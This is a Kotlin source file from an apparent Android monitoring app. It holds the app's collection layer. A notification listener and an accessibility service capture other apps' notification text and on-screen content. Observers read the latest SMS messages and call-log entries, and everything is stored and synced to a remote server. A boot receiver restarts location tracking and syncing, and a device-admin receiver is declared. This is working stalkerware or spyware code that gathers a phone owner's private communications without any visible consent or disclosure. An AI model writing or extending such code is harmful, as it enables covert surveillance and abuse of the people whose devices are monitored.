package ru.observer.app.collect

import android.app.admin.DeviceAdminReceiver
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.database.ContentObserver
import android.os.Handler
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import ru.observer.app.data.Db
import ru.observer.app.data.Event
import ru.observer.app.net.Ws
import ru.observer.app.sync.Sync
import ru.observer.app.util.Util

class NotifListener : NotificationListenerService() {
    private val skip = setOf("android", "com.android.systemui", "ru.observer.app")

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        val pkg = sbn.packageName ?: return
        if (pkg in skip) return
        val ex = sbn.notification.extras ?: return
        val title = ex.getCharSequence(android.app.Notification.EXTRA_TITLE)?.toString() ?: return
        val body = ex.getCharSequence(android.app.Notification.EXTRA_TEXT)?.toString() ?: ""
        val label = Util.label(this, pkg)
        CoroutineScope(Dispatchers.IO).launch {
            Db.get(this@NotifListener).dao().add(Event(kind = "notif", app = label,
                contact = "$label|$title", title = title, body = body, src = "notif"))
            Sync.now(this@NotifListener)
        }
    }
}

class A11yService : android.accessibilityservice.AccessibilityService() {
    private var last = ""
    private var at = 0L

    override fun onAccessibilityEvent(e: AccessibilityEvent?) {
        e ?: return
        if (e.packageName == packageName) return
        val now = System.currentTimeMillis()
        if (now - at < 2000) return
        at = now
        val root = rootInActiveWindow ?: return
        val sb = StringBuilder()
        walk(root, sb, 0)
        val text = sb.toString().trim()
        if (text.length < 10 || text == last) return
        last = text
        val pkg = e.packageName?.toString() ?: return
        val label = Util.label(this, pkg)
        CoroutineScope(Dispatchers.IO).launch {
            Db.get(this@A11yService).dao().add(Event(kind = "screen", app = label,
                contact = "$label|экран", title = "экран", body = text.take(1000), src = "screen"))
            Sync.now(this@A11yService)
        }
    }

    override fun onInterrupt() {}

    private fun walk(n: AccessibilityNodeInfo?, sb: StringBuilder, d: Int) {
        n ?: return
        if (d > 12) return
        n.text?.toString()?.takeIf { it.isNotBlank() }?.let { sb.append(it).append('\n') }
        for (i in 0 until n.childCount) walk(n.getChild(i), sb, d + 1)
    }
}

class SmsObserver(c: Context, h: Handler) : ContentObserver(h) {
    private val ctx = c.applicationContext
    override fun onChange(selfChange: Boolean) {
        try {
            val cur = ctx.contentResolver.query(android.net.Uri.parse("content://sms"),
                arrayOf("address", "body"), null, null, "date DESC") ?: return
            cur.use {
                if (!it.moveToFirst()) return
                val addr = it.getString(0) ?: return
                val body = it.getString(1) ?: ""
                CoroutineScope(Dispatchers.IO).launch {
                    Db.get(ctx).dao().add(Event(kind = "sms", app = "SMS",
                        contact = "SMS|$addr", title = addr, body = body, src = "sms"))
                    Sync.now(ctx)
                }
            }
        } catch (e: Exception) {}
    }
}

class CallObserver(c: Context, h: Handler) : ContentObserver(h) {
    private val ctx = c.applicationContext
    override fun onChange(selfChange: Boolean) {
        try {
            val cur = ctx.contentResolver.query(android.net.Uri.parse("content://call_log/calls"),
                arrayOf("number", "type", "duration"), null, null, "date DESC") ?: return
            cur.use {
                if (!it.moveToFirst()) return
                val num = it.getString(0) ?: "неизвестный"
                val type = when (it.getInt(1)) { 1 -> "входящий"; 2 -> "исходящий"; 3 -> "пропущенный"; else -> "другое" }
                val dur = it.getInt(2)
                CoroutineScope(Dispatchers.IO).launch {
                    Db.get(ctx).dao().add(Event(kind = "call", app = "Телефон",
                        contact = "Телефон|$num", title = num, body = "$type · ${dur}с", src = "call"))
                    Sync.now(ctx)
                }
            }
        } catch (e: Exception) {}
    }
}

class BootReceiver : BroadcastReceiver() {
    override fun onReceive(c: Context, i: Intent) {
        LocationService.start(c); Ws.start(c); Sync.start(c)
    }
}

class AdminReceiver : DeviceAdminReceiver()
